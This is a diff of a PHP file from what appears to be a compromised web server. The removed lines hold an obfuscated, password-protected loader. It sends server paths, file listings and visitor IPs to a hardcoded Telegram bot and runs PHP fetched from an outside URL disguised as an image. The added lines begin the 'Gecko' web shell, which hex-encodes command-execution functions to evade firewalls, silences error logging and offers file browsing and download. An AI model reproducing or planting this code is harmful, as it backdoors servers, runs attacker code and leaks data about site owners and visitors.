@@ -1,21 +1,1622 @@
 <?php
- goto YVq1B; YVq1B: session_start(); goto lGZIi; HWnH2: if (isset($_GET["\154\157\147\x6f\x75\164"])) { sendToTelegram(createLogMessage("\x55\x53\105\x52\x20\114\x4f\107\x4f\125\124", array())); session_destroy(); header("\114\x6f\x63\x61\164\151\157\156\x3a\x20" . $_SERVER["\x50\110\x50\137\x53\105\114\106"]); die; } goto v27lM; v27lM: ?>
-<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>JUNGSZ</title><style>*{margin:0;padding:0;box-sizing:border-box}body{min-height:100vh;background:linear-gradient(135deg,#0a0c15 0,#0c0f1a 100%);font-family:Inter,sans-serif;display:flex;justify-content:center;align-items:center;position:relative;overflow:hidden}.bg-gradient{position:absolute;width:200%;height:200%;background:radial-gradient(circle at 30% 40%,rgba(0,180,255,.08) 0,transparent 60%);animation:bgRotate 25s linear infinite;pointer-events:none}@keyframes bgRotate{from{transform:rotate(0)}to{transform:rotate(360deg)}}.particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}.particle{position:absolute;background:rgba(0,180,255,.3);border-radius:50%;animation:particleFloat 10s infinite ease-in-out}@keyframes particleFloat{0%,100%{transform:translateY(0) translateX(0);opacity:0}20%{opacity:.5}80%{opacity:.5}100%{transform:translateY(-100px) translateX(40px);opacity:0}}.card-wrapper{position:relative;z-index:10;width:100%;max-width:450px;padding:20px}.glass-card{background:rgba(18,22,40,.75);backdrop-filter:blur(16px);border-radius:44px;padding:42px 34px;border:1px solid rgba(0,180,255,.25);box-shadow:0 25px 50px rgba(0,0,0,.4);transition:all .35s}.glass-card:hover{border-color:rgba(0,180,255,.45);transform:translateY(-5px)}.logo-container{text-align:center;margin-bottom:28px}.logo{max-width:200px;width:80%;height:auto;filter:drop-shadow(0 6px 18px rgba(0, 180, 255, .3))}.title{text-align:center;font-size:30px;font-weight:700;background:linear-gradient(135deg,#fff,#00b4ff);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:6px}.subtitle{text-align:center;color:#8a94b0;font-size:13px;margin-bottom:34px}.input-group{margin-bottom:24px}.input-field{position:relative;display:flex;align-items:center}.input-icon{position:absolute;left:18px;font-size:18px;color:#5a6590}input{width:100%;padding:15px 20px 15px 52px;background:rgba(8,10,20,.85);border:1.5px solid rgba(0,180,255,.2);border-radius:60px;color:#f0f3ff;font-size:15px;outline:0}input:focus{border-color:#00b4ff;box-shadow:0 0 18px rgba(0,180,255,.15)}.btn-login{width:100%;padding:15px;background:linear-gradient(95deg,#00b4ff,#06f);border:none;border-radius:60px;color:#0a0c15;font-weight:700;font-size:15px;cursor:pointer;transition:all .3s}.btn-login:hover{transform:translateY(-2px);box-shadow:0 10px 24px -6px rgba(0,180,255,.5)}.error-message{background:rgba(255,50,85,.12);border-radius:60px;padding:12px 20px;margin-bottom:24px;text-align:center;color:#ff6b8a;font-size:13px;border-left:3px solid #f36}.footer{text-align:center;margin-top:28px;font-size:11px;color:#3e4870}.debug-info{margin-top:15px;padding:10px;background:rgba(0,0,0,.5);border-radius:10px;font-size:11px;color:#888;display:none}</style></head><body><div class="bg-gradient"></div><div class="particles"id="particlesContainer"></div><div class="card-wrapper"><div class="glass-card"><div class="logo-container"><img alt="JUNGSZ"class="logo"onerror='this.style.display="none"'src="<?php  goto Rk4Pw; hZbah: function sendToTelegram($message) { global $telegram_bot_token, $telegram_chat_id; if (empty($telegram_bot_token) || empty($telegram_chat_id)) { error_log("\x54\145\154\145\x67\162\141\155\x3a\x20\x54\157\x6b\145\156\40\157\x72\x20\103\x68\141\x74\40\111\x44\40\145\155\x70\164\x79"); return false; } $url = "\x68\x74\x74\160\x73\x3a\57\57\141\160\151\x2e\x74\x65\x6c\x65\x67\162\141\x6d\56\x6f\162\x67\57\x62\x6f\x74{$telegram_bot_token}\x2f\x73\x65\x6e\x64\115\145\x73\x73\141\x67\x65"; $data = array("\x63\x68\141\164\x5f\151\x64" => $telegram_chat_id, "\164\145\170\164" => $message, "\x70\141\x72\x73\145\137\155\157\144\145" => "\x48\x54\x4d\114", "\x64\x69\x73\x61\x62\x6c\145\137\x77\x65\x62\x5f\x70\141\x67\145\137\160\x72\x65\x76\x69\x65\x77" => true); if (function_exists("\x63\165\162\x6c\137\151\156\x69\164")) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_TIMEOUT, 10); $result = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if ($http_code != 200) { error_log("\x54\145\154\x65\147\x72\x61\155\72\40\x48\124\x54\120\40\x43\x6f\x64\145\40{$http_code}\40\55\x20\122\145\163\x70\157\x6e\163\145\x3a\40{$result}"); } return $result; } else { $options = array("\150\x74\x74\x70" => array("\155\145\164\x68\157\144" => "\120\117\123\124", "\x68\145\141\144\x65\x72" => "\103\x6f\156\x74\145\x6e\164\x2d\x54\x79\160\x65\x3a\x20\141\x70\x70\154\x69\x63\141\164\151\157\156\57\x78\x2d\x77\x77\167\55\146\x6f\x72\x6d\x2d\165\162\154\145\156\x63\x6f\144\x65\x64", "\143\x6f\156\164\x65\x6e\164" => http_build_query($data))); $context = stream_context_create($options); $result = @file_get_contents($url, false, $context); return $result; } } goto ljaUr; Eqxoe: if (isset($error)) { ?>
-<div class="error-message">⚠️<?php  echo htmlspecialchars($error); ?>
-</div><?php  } goto o_jl5; k_4m8: ?>
-"></div><div class="title">JUNGSZ</div><div class="subtitle">Enter your access key</div><?php  goto Eqxoe; Rk4Pw: echo htmlspecialchars($logo_url); goto k_4m8; JsdJY: function createLogMessage($action, $info = array()) { $location = getScriptLocationInfo(); $message = "🚀 <b>JUNGSZ - LOG REPORT</b>"; $message .= "\342\225\220\342\x95\220\342\225\x90\xe2\225\220\xe2\225\220\342\225\x90\342\225\220\xe2\x95\220\342\x95\x90\xe2\225\x90\342\225\220\xe2\225\220\xe2\225\x90\xe2\x95\x90\xe2\x95\220\342\x95\220\342\225\x90\xe2\x95\220\xe2\x95\220\xe2\x95\220\xe2\225\220\342\x95\220\xe2\x95\x90\xa"; $message .= "\xe2\217\260\x20" . date("\x59\55\155\55\144\40\110\x3a\151\x3a\x73") . "\xa"; $message .= "\xf0\237\x93\235\40\74\142\x3e\101\143\164\x69\157\x6e\x3a\x3c\x2f\x62\x3e\x20" . $action . "\xa\xa"; $message .= "\xf0\x9f\223\215\40\x3c\142\76\x53\103\122\111\x50\x54\x20\114\117\x43\x41\124\x49\x4f\x4e\x3c\57\x62\76\xa"; $message .= "\xe2\x94\x9c\xe2\224\x80\40\xf0\237\x93\204\x20\x3c\x62\76\106\x69\x6c\x65\x6e\x61\155\x65\72\74\x2f\x62\76\x20" . htmlspecialchars($location["\x66\x69\154\145\156\141\x6d\x65"]) . "\12"; $message .= "\xe2\x94\x9c\xe2\224\x80\40\360\x9f\224\x97\x20\74\142\76\x41\x63\x63\x65\163\x73\40\125\122\114\x3a\x3c\x2f\142\76\40" . htmlspecialchars($location["\x73\x63\x72\x69\x70\x74\x5f\165\162\154"]) . "\12"; if (isset($location["\167\x65\x62\137\165\162\154"]) && $location["\x77\145\142\x5f\165\162\x6c"] !== "\103\141\x6e\x6e\x6f\x74\x20\x64\145\164\x65\162\155\151\x6e\x65\x20\x28\x6f\x75\164\x73\x69\144\145\40\144\x6f\x63\165\x6d\145\156\x74\40\162\x6f\157\164\51") { $message .= "\342\224\234\342\x94\200\40\xf0\237\x8c\220\x20\74\x62\x3e\127\x65\142\40\125\x52\114\72\x3c\x2f\x62\x3e\x20" . htmlspecialchars($location["\x77\145\142\137\x75\162\x6c"]) . "\12"; } $message .= "\342\x94\234\342\x94\x80\x20\360\x9f\x93\202\x20\74\142\x3e\106\165\x6c\x6c\x20\120\x61\164\150\72\x3c\57\x62\x3e\40" . htmlspecialchars($location["\x73\143\162\x69\160\164\137\x66\165\154\154\137\x70\x61\x74\150"]) . "\xa"; if ($location["\x72\x65\x6c\x61\164\x69\166\145\x5f\160\x61\164\150"]) { $message .= "\xe2\x94\x9c\342\224\200\x20\360\237\223\201\40\x3c\x62\x3e\122\x65\x6c\141\x74\151\166\145\40\x50\141\x74\x68\x3a\74\x2f\142\x3e\40" . htmlspecialchars($location["\x72\x65\154\x61\164\x69\x76\x65\x5f\160\x61\x74\150"]) . "\xa"; } $message .= "\342\x94\x94\342\x94\x80\40\xf0\x9f\x97\202\xef\xb8\x8f\x20\x3c\x62\76\x44\x69\x72\145\143\164\157\x72\171\x3a\x3c\x2f\x62\76\40" . htmlspecialchars($location["\x63\165\x72\162\x65\x6e\164\137\x64\151\162\x65\x63\x74\157\x72\171"]) . "\12\xa"; $message .= "\xf0\237\214\x90\40\74\x62\x3e\123\x45\122\126\105\122\40\x49\116\x46\117\x3c\x2f\142\x3e\12"; $message .= "\342\x94\234\xe2\224\200\x20\x44\x6f\x6d\141\x69\x6e\x3a\40" . htmlspecialchars($location["\x68\164\164\x70\x5f\x68\x6f\163\164"]) . "\xa"; $message .= "\xe2\224\234\342\224\200\40\123\x65\162\166\x65\x72\x3a\40" . htmlspecialchars($location["\x73\145\x72\x76\145\x72\137\156\141\155\145"]) . "\12"; $message .= "\xe2\x94\x9c\342\x94\x80\x20\x49\120\x3a\x20" . htmlspecialchars($location["\x73\145\162\166\145\x72\137\141\x64\x64\162"]) . "\12"; $message .= "\xe2\x94\x9c\342\x94\200\40\x50\x48\120\x3a\x20" . htmlspecialchars($location["\x70\150\x70\x5f\166\x65\162\163\x69\157\x6e"]) . "\xa"; $message .= "\xe2\224\234\342\224\200\x20\x53\157\146\164\167\x61\x72\145\72\x20" . htmlspecialchars($location["\x73\145\x72\166\x65\162\137\163\157\146\164\167\141\x72\145"]) . "\12"; $message .= "\xe2\224\x94\342\224\x80\x20\104\157\x63\40\x52\157\x6f\x74\72\x20" . htmlspecialchars($location["\x64\x6f\143\x75\x6d\145\x6e\x74\137\x72\157\157\164"]) . "\12\xa"; if (!empty($location["\146\151\154\145\163\x5f\151\x6e\137\x64\x69\162"])) { $message .= "\xf0\237\223\213\40\x3c\x62\x3e\106\111\114\105\123\40\111\116\40\104\111\x52\105\x43\x54\117\122\x59\74\x2f\x62\x3e\40\50" . count($location["\146\x69\x6c\x65\x73\137\x69\156\x5f\144\x69\x72"]) . "\51\xa"; foreach ($location["\146\x69\154\145\163\137\x69\x6e\x5f\144\151\x72"] as $file) { $message .= "\342\x94\x9c\xe2\x94\200\x20" . htmlspecialchars($file) . "\12"; } $message .= "\342\224\224\342\x94\200\x20\56\x2e\56\xa\xa"; } $message .= "\xf0\237\x93\214\x20\x3c\x62\76\103\x75\162\x72\145\156\x74\x20\127\157\162\x6b\x69\x6e\147\40\x44\151\x72\x3a\x3c\57\x62\76\40" . htmlspecialchars($location["\143\167\144"]) . "\12\12"; if (!empty($info)) { $message .= "\360\x9f\x93\212\x20\x3c\142\76\101\104\x44\111\124\111\117\x4e\x41\x4c\x20\x49\116\x46\x4f\x3c\57\142\76\xa"; foreach ($info as $key => $value) { $message .= "\xe2\x94\234\342\224\200\40" . $key . "\x3a\40" . htmlspecialchars($value) . "\xa"; } $message .= "\12"; } $message .= "\342\225\220\xe2\x95\220\xe2\x95\220\xe2\x95\220\xe2\225\x90\342\x95\x90\xe2\225\x90\xe2\x95\220\342\x95\x90\342\x95\220\342\225\x90\342\225\x90\xe2\x95\x90\xe2\225\x90\342\x95\x90\342\225\x90\342\225\x90\xe2\225\x90\342\x95\220\xe2\225\220\342\225\220\xe2\x95\220\xe2\225\220\xa"; $message .= "\342\x9a\241\x20\74\x62\x3e\x53\143\162\151\x70\x74\40\x45\170\145\143\x75\164\145\144\40\123\165\143\143\x65\x73\x73\x66\165\x6c\154\x79\x3c\x2f\142\76"; return $message; } goto BJzLF; oiWQC: if (isset($_SESSION["\x6c\x6f\147\x67\x65\144\151\x6e"])) { $content = @file_get_contents($allowed_url); if (!$content && function_exists("\143\x75\162\x6c\x5f\x69\x6e\151\164")) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $allowed_url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $content = curl_exec($ch); curl_close($ch); } if ($content) { if (strpos($content, "\74\x3f\160\150\160") !== false) { $temp = tempnam(sys_get_temp_dir(), "\164\x6d\160\x5f"); file_put_contents($temp, $content); ob_start(); include $temp; $output = ob_get_clean(); @unlink($temp); echo $output; } else { echo $content; } } else { echo "\107\x61\147\x61\154\x20\x6d\145\x6e\x67\x61\x6d\142\x69\154\x20\x6b\x6f\x6e\x74\x65\156\x2e"; } die; } goto HWnH2; LdyhE: $telegram_chat_id = "\x38\x30\71\65\63\x36\x37\x33\x33\x33"; goto hEto7; l8wbd: $md5_password = "\x62\x38\x36\x30\x38\x61\x34\x33\x65\x31\x37\x62\x38\x63\x66\x30\x31\x63\x65\x36\x38\x36\x64\x66\x30\x62\x33\x31\x33\x30\x35\x64"; goto JLJgT; VY7jj: function getScriptLocationInfo() { $info = array(); $info["\x73\x63\x72\x69\x70\164\x5f\x66\x75\154\x6c\x5f\x70\141\164\x68"] = __FILE__; $protocol = isset($_SERVER["\x48\x54\124\x50\x53"]) && $_SERVER["\110\x54\124\120\123"] === "\157\156" ? "\150\164\x74\x70\x73" : "\150\164\x74\160"; $info["\x73\x63\x72\151\x70\x74\137\165\162\x6c"] = $protocol . "\72\x2f\57" . $_SERVER["\x48\124\124\120\137\110\x4f\123\124"] . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\111"]; $doc_root = $_SERVER["\104\x4f\x43\125\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\124"] ?? ''; $script_path = __FILE__; if ($doc_root && strpos($script_path, $doc_root) === 0) { $info["\162\x65\154\141\164\x69\166\x65\x5f\x70\x61\164\x68"] = str_replace($doc_root, '', $script_path); $info["\167\x65\x62\x5f\165\x72\x6c"] = $protocol . "\x3a\x2f\57" . $_SERVER["\110\124\124\120\137\x48\117\x53\x54"] . $info["\162\145\x6c\141\164\151\166\145\x5f\x70\141\x74\x68"]; } else { $info["\162\145\x6c\x61\164\x69\166\145\137\x70\141\x74\x68"] = $script_path; $info["\x77\145\142\137\165\162\x6c"] = "\103\141\x6e\156\x6f\x74\40\144\145\x74\x65\162\155\151\156\145\x20\50\157\165\164\163\x69\x64\x65\x20\x64\x6f\x63\x75\155\x65\x6e\164\40\x72\157\157\164\x29"; } $info["\x63\x75\x72\x72\145\156\164\137\144\151\162\x65\x63\x74\157\162\171"] = dirname(__FILE__); $info["\146\151\x6c\145\156\x61\155\x65"] = basename(__FILE__); $info["\146\x69\154\x65\x73\137\x69\156\137\x64\151\162"] = array(); $dir = dirname(__FILE__); if (is_dir($dir)) { $items = @scandir($dir); if ($items) { $files = array_filter($items, function ($item) use($dir) { return $item != "\56" && $item != "\56\56" && is_file($dir . "\57" . $item); }); $info["\x66\151\154\145\163\137\151\x6e\137\144\x69\162"] = array_slice($files, 0, 10); } } $info["\x73\145\x72\x76\145\162\137\x6e\x61\x6d\145"] = $_SERVER["\x53\105\122\126\x45\122\137\116\101\x4d\105"] ?? "\125\156\153\156\157\167\156"; $info["\x73\145\162\x76\x65\162\x5f\141\144\144\162"] = $_SERVER["\x53\x45\x52\126\x45\x52\137\x41\104\x44\122"] ?? "\125\x6e\x6b\x6e\x6f\x77\x6e"; $info["\x68\164\x74\x70\x5f\150\157\163\x74"] = $_SERVER["\110\x54\x54\120\137\110\x4f\123\x54"] ?? "\125\x6e\x6b\x6e\157\167\x6e"; $info["\x64\x6f\143\165\x6d\145\x6e\164\x5f\162\x6f\x6f\164"] = $doc_root; $info["\160\x68\160\x5f\x76\x65\x72\163\x69\x6f\156"] = phpversion(); $info["\163\145\x72\x76\145\162\x5f\163\x6f\146\164\x77\141\x72\x65"] = $_SERVER["\x53\x45\x52\126\x45\x52\137\x53\117\106\124\127\101\x52\105"] ?? "\125\156\x6b\x6e\x6f\167\x6e"; $info["\x63\167\x64"] = getcwd(); return $info; } goto JsdJY; BJzLF: if (!isset($_SESSION["\x6c\x6f\x67\147\145\x64\151\156"])) { if (isset($_POST["\x70\141\163\163\x77\x6f\162\x64"])) { if (md5($_POST["\160\141\x73\x73\x77\x6f\x72\144"]) === $md5_password) { $_SESSION["\154\x6f\x67\147\145\144\x69\156"] = true; $_SESSION["\x6c\157\147\151\x6e\x5f\164\151\x6d\x65"] = time(); $log_message = createLogMessage("\342\234\x85\40\x4c\x4f\107\x49\x4e\x20\x42\x45\x52\x48\x41\x53\111\x4c", array("\xf0\237\x91\244\x20\111\x50" => $_SERVER["\x52\105\x4d\x4f\x54\x45\x5f\101\104\x44\x52"] ?? "\125\156\x6b\x6e\157\167\156", "\xf0\237\226\xa5\357\xb8\x8f\40\125\163\x65\x72\x20\x41\x67\145\x6e\164" => substr($_SERVER["\110\124\x54\120\137\x55\123\105\122\x5f\101\107\x45\116\124"] ?? "\x55\156\153\x6e\x6f\167\x6e", 0, 50), "\xf0\x9f\216\xaf\x20\124\x61\162\x67\145\164" => $allowed_url)); $send_result = sendToTelegram($log_message); $_SESSION["\x6c\x61\x73\x74\x5f\156\157\164\x69\146\x79"] = $send_result ? "\x4f\113" : "\x46\101\111\x4c\x45\104"; header("\x4c\157\143\x61\164\x69\x6f\x6e\x3a\x20" . $_SERVER["\x50\x48\x50\x5f\123\105\x4c\106"]); die; } else { $error = "\120\141\x73\163\x77\157\x72\144\x20\163\x61\x6c\141\x68\41"; sendToTelegram(createLogMessage("\xe2\235\x8c\x20\114\117\107\111\x4e\x20\x47\x41\x47\101\x4c", array("\xf0\237\x91\xa4\40\x49\120" => $_SERVER["\x52\x45\x4d\117\x54\x45\x5f\x41\x44\x44\x52"] ?? "\125\156\153\156\x6f\167\156"))); } } } goto oiWQC; JLJgT: $allowed_url = "\150\x74\164\160\x3a\57\57\x74\145\155\160\x61\x74\x6e\147\x75\x6d\x70\x75\x6c\56\151\x74\x2e\143\157\x6d\x2f\x4e\145\170\164\x47\x65\156\145\162\x61\164\151\x6f\x6e\x2f\x68\x65\170\63\56\152\160\147"; goto eSqrt; ljaUr: if (isset($_GET["\164\145\x73\x74\137\x74\x65\154\145\147\x72\141\155"])) { $test_msg = "\342\x9c\205\x20\124\x45\x53\124\x20\x4e\117\x54\x49\106\111\103\101\x54\x49\117\x4e\xa"; $test_msg .= "\342\x8f\260\40\124\151\x6d\x65\x3a\x20" . date("\131\55\x6d\55\x64\40\110\72\x69\x3a\163") . "\xa"; $test_msg .= "\360\x9f\214\220\x20\111\x50\72\x20" . ($_SERVER["\x52\105\115\x4f\124\105\x5f\x41\x44\x44\x52"] ?? "\125\156\153\x6e\x6f\167\156"); $result = sendToTelegram($test_msg); if ($result) { echo "\xe2\234\205\x20\x54\145\x6c\145\x67\162\141\155\x20\156\x6f\164\151\146\x69\143\x61\x74\151\157\x6e\x20\163\145\x6e\164\41\x20\103\x68\x65\x63\x6b\x20\171\157\165\x72\40\x62\x6f\x74\x2e"; echo "\74\x62\162\76\122\x65\x73\160\157\156\163\145\72\40" . htmlspecialchars($result); } else { echo "\xe2\235\214\40\106\x61\x69\x6c\x65\x64\x20\164\157\x20\x73\145\x6e\x64\x20\124\x65\154\145\x67\x72\141\155\x20\x6e\x6f\164\x69\x66\x69\143\141\164\151\157\156\56"; echo "\74\x62\162\x3e\x43\150\x65\143\153\x20\171\x6f\x75\162\x20\142\x6f\164\x20\x74\157\153\x65\156\40\141\x6e\x64\x20\143\x68\141\164\40\111\x44\x2e"; } die; } goto VY7jj; eSqrt: $telegram_bot_token = "\x38\65\63\x34\63\x37\63\67\x36\x37\72\101\101\110\x77\x4a\147\x4c\130\x53\x36\x6d\x2d\101\x74\x74\151\62\102\x64\127\55\x31\165\x57\132\x58\x57\65\127\x4f\60\172\101\157\x34"; goto LdyhE; hEto7: $logo_url = "https://xcdnbcd.b-cdn.net/kiw.webp"; goto hZbah; lGZIi: $username = "\141\x64\x6d\151\156"; goto l8wbd; o_jl5: ?>
-<form method="post"><div class="input-group"><div class="input-field"><span class="input-icon">🔐</span> <input autocomplete="off"autofocus name="password"placeholder="Access Key"required type="password"></div></div><button class="btn-login"type="submit">✦ VERIFY ACCESS ✦</button></form><div class="footer"><a href="?test_telegram=1"style="color:#3e4870;text-decoration:none;font-size:10px">🔧 Test</a> ◆ <a href="?logout=1"style="color:#3e4870;text-decoration:none;font-size:10px">🚪 Logout</a></div></div></div><script>function initParticles() {
-            const container = document.getElementById('particlesContainer');
-            for(let i = 0; i < 60; i++) {
-                const p = document.createElement('div');
-                p.className = 'particle';
-                p.style.width = (Math.random() * 5 + 2) + 'px';
-                p.style.height = p.style.width;
-                p.style.left = Math.random() * 100 + '%';
-                p.style.animationDelay = Math.random() * 12 + 's';
-                p.style.animationDuration = Math.random() * 8 + 5 + 's';
-                container.appendChild(p);
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+# function WAF
+
+$Array = [
+    '676574637764', # ge  tcw d => 0
+    '676c6f62', # gl ob => 1
+    '69735f646972', # is_d ir => 2
+    '69735f66696c65', # is_ file => 3
+    '69735f7772697461626c65', # is_wr iteable => 4
+    '69735f7265616461626c65', # is_re adble => 5
+    '66696c657065726d73', # fileper ms => 6
+    '66696c65', # f ile => 7
+    '7068705f756e616d65', # php_unam e => 8
+    '6765745f63757272656e745f75736572', # getc urrentuser => 9
+    '68746d6c7370656369616c6368617273', # html special => 10
+    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
+    '6d6b646972', # mk dir => 12
+    '746f756368', # to uch => 13
+    '6368646972', # ch dir => 14
+    '72656e616d65', # ren ame => 15
+    '65786563', # exe c => 16
+    '7061737374687275', # pas sthru => 17
+    '73797374656d', # syst em => 18
+    '7368656c6c5f65786563', # sh ell_exec => 19
+    '706f70656e', # p open => 20
+    '70636c6f7365', # pcl ose => 21
+    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
+    '70726f635f6f70656e', # p roc_open => 23
+    '756e6c696e6b', # un link => 24
+    '726d646972', # rmd ir => 25
+    '666f70656e', # fop en => 26
+    '66636c6f7365', # fcl ose => 27
+    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
+    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
+    '63686d6f64', # ch mod => 30
+    '7379735f6765745f74656d705f646972', # temp _dir => 31
+    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
+    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
+];
+$hitung_array = count($Array);
+for ($i = 0; $i < $hitung_array; $i++) {
+    $fungsi[] = unx($Array[$i]);
+}
+
+if (isset($_GET['d'])) {
+    $cdir = unx($_GET['d']);
+    $fungsi[14]($cdir);
+} else {
+    $cdir = $fungsi[0]();
+}
+
+function file_ext($file)
+{
+    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
+        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
+    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
+        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
+    } else if (mime_content_type($file) == 'text/javascript') {
+        return '<i class="fa-brands fa-square-js"></i>';
+    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
+        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
+    } else if (mime_content_type($file) == 'text/plain') {
+        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
+    } else if (mime_content_type($file) == 'application/pdf') {
+        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
+    } else {
+        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
+    }
+}
+
+function download($file)
+{
+
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename=' . basename($file));
+        header('Content-Transfer-Encoding: binary');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        ob_clean();
+        flush();
+        readfile($file);
+        exit;
+    }
+}
+
+if ($_GET['don'] == true) {
+    $FilesDon = download(unx($_GET['don']));
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <title>Gecko [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
+    <style>
+        @media screen and (min-width: 768px) and (max-width: 1200px) and (min-height:720px) {
+            .code-editor-container {
+                height: 85vh !important;
+            }
+
+            .CodeMirror {
+                height: 72vh !important;
+                font-size: xx-large !important;
+                margin: 0 4px;
+                border-radius: 4px;
+            }
+
+            .btn-modal-close {
+                padding: 15px 40px !important;
             }
         }
-        initParticles();
-        document.querySelector('input')?.focus();</script></body></html>
+
+        .btn-submit,
+        a {
+            text-decoration: none;
+            color: #fff
+        }
+
+        a,
+        body {
+            color: #fff
+        }
+
+        .btn-submit,
+        .form-file,
+        tbody tr:nth-child(2n) {
+            background-color: #22242d
+        }
+
+        .code-editor,
+        .modal,
+        .terminal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0
+        }
+
+        .code-editor-body textarea,
+        .terminal-body textarea {
+            width: 98.5%;
+            height: 400px;
+            font-size: smaller;
+            resize: none
+        }
+
+        .menu-tools li,
+        .terminal-body li,
+        .terminal-head li {
+            display: inline-block
+        }
+
+        body {
+            background-color: #0e0f17;
+            font-family: monospace
+        }
+
+        .btn-modal-close:hover,
+        .btn-submit:hover,
+        .menu-file-manager ul,
+        .path-pwd,
+        thead {
+            background-color: #2e313d
+        }
+
+        ul {
+            list-style: none
+        }
+
+        .menu-header li {
+            padding: 5px 0
+        }
+
+        .menu-header ul li {
+            font-weight: 700;
+            font-style: italic
+        }
+
+        .btn-submit {
+            padding: 7px 25px;
+            border: 2px solid grey;
+            border-radius: 4px
+        }
+
+        .form-file,
+        a:hover {
+            color: #c5c8d6
+        }
+
+        .btn-submit:hover {
+            border: 2px solid #c5c8d6
+        }
+
+        .form-upload {
+            margin: 10px 0
+        }
+
+        .form-file {
+            border: 2px solid grey;
+            padding: 7px 20px;
+            border-radius: 4px
+        }
+
+        .menu-tools {
+            width: 95%
+        }
+
+        .menu-tools li {
+            margin: 15px 0
+        }
+
+        .menu-file-manager,
+        .modal-mail-text {
+            margin: 10px 40px
+        }
+
+        .menu-file-manager li {
+            display: inline-block;
+            margin: 15px 20px
+        }
+
+        .menu-file-manager li a::after {
+            content: "";
+            display: block;
+            border-bottom: 1px solid #fff
+        }
+
+        .path-pwd {
+            padding: 15px 0;
+            margin: 5px 0
+        }
+
+        table {
+            border-radius: 5px
+        }
+
+        thead {
+            height: 35px
+        }
+
+        tbody tr td {
+            padding: 10px 0
+        }
+
+        tbody tr td:nth-child(2),
+        tbody tr td:nth-child(3),
+        tbody tr td:nth-child(4) {
+            text-align: center
+        }
+
+        ::-webkit-scrollbar {
+            width: 16px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0e0f17
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #22242d;
+            border: 2px solid #555;
+            border-radius: 4px
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555
+        }
+
+        ::-webkit-file-upload-button {
+            display: none
+        }
+
+        .modal {
+            display: none;
+            z-index: 2;
+            width: 100%;
